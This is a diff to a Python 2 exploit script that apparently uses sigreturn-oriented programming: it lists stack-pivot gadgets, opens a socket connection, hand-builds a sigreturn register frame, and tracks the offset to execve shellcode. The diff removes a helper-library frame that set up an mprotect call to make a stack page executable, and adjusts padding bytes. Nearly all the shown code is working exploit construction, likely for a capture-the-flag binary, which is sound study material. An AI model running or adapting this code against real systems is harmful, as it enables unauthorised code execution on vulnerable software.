@@ -1,7 +1,6 @@
 from socket import create_connection
 import struct
 import string
-from Frame import SigreturnFrame
 
 # 0x080c2812: mov esp,ecx ; ret
 # 0x0804e25f: "\x5c\xc3 <==> pop esp; ret"
@@ -41,28 +40,6 @@ print "[+] mmap'd page address is", hex(page)
 
 sploit = ""
 sploit += struct.pack("<I", SIGRETURN_IND)
-"""
-frame = SigreturnFrame(sane=False, nulls_allowed=True)
-
-# Frame that tries to call mprotect
-frame.set_regvalue("eax", SYS_MPROTECT)
-frame.set_regvalue("ebx", 0xbffdf000)
-frame.set_regvalue("ecx", 0x1000)
-frame.set_regvalue("edx", 0x7)
-frame.set_regvalue("esi", 0x0)
-frame.set_regvalue("edi", 0x0)
-frame.set_regvalue("ebp", 0xbffdf000)
-frame.set_regvalue("eip", INT_80)
-frame.set_regvalue("esp", POP_ESP_RET)
-frame.set_regvalue("cs", 0x73)
-#frame.set_regvalue("ss", 0x73)
-frame.set_regvalue("ds", 0x73)
-frame.set_regvalue("es", 0x73)
-frame.set_regvalue("fs", 0x0)
-frame.set_regvalue("gs", 0x0)
-
-x = frame.get_frame()
-"""
 
 frame  = ""
 frame += struct.pack("<I", 0x0) #gs
@@ -88,7 +65,7 @@ print "[+] Length of frame generated is", len(x)
 
 #ss = struct.pack("<h", 0x7b) # ss probably
 #sploit += ss
-sploit += "AAAA\x7b\x00AA"
+sploit += "\x00" * 4 + "\x7b\x00" + "\x00" * 2
 sploit += struct.pack("<I", 0x0) #maybe floating point value
 
 print "[+] Offset of shellcode execve", len(sploit)
